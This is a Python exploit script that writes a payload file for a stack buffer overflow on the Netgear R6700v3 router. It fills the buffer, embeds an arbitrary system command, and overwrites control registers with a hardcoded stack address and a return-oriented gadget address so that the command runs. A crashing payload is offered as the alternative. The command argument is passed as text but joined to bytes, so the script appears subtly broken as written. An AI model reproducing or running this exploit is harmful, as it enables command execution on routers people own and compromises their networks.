#!/usr/bin/env python3
## -*- coding: utf-8 -*-
import argparse


def create_payload(cmd: str = None) -> bytes:
    if cmd:
        len_md5_sum = 32
        max_len_cmd = 332
        payload  = b"A"*(len_md5_sum+2)             # 2nd fgets will overwrite this with an MD5 sum (plus "\n" and "\x00")
        payload += cmd[:max_len_cmd]                # System command to execute
        payload += b";#"                            # Terminate command and ignore what follows (since we cannot use "\x00)
        payload += b"B"*(max_len_cmd - len(cmd))    # Fill up depending on the command length
        payload += b"\x26\xc1\xff\xbe"              # r6 = r0 = 0xbeffc104 + 32 + 2 = 0xbeffc126 (address of command - no ASLR)
        payload += b"C"*20                          # Fill up
        payload += b"\xb8\xc9\x00\x00"              # pc (address of gadget: mov r0, r6; bl #0x94a0)
    else:
        payload = b"A"*1000 + b" B"
    return payload

def main() -> None:
    # Argument parsing
    description = """
    Create payload to exploit a stack buffer overflow on Netgear R6700v3.
    """
    parser = argparse.ArgumentParser(description=description,
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("--cmd", default=None, help="system command to execute or empty for sample crashing payload")
    parser.add_argument("--out", default="circleinfo.txt", help="output file containing the payload")
    args = parser.parse_args()

    payload = create_payload(args.cmd)
    with open(args.out, "wb") as f:
        f.write(payload)
    
    return

if __name__ == "__main__":
    main()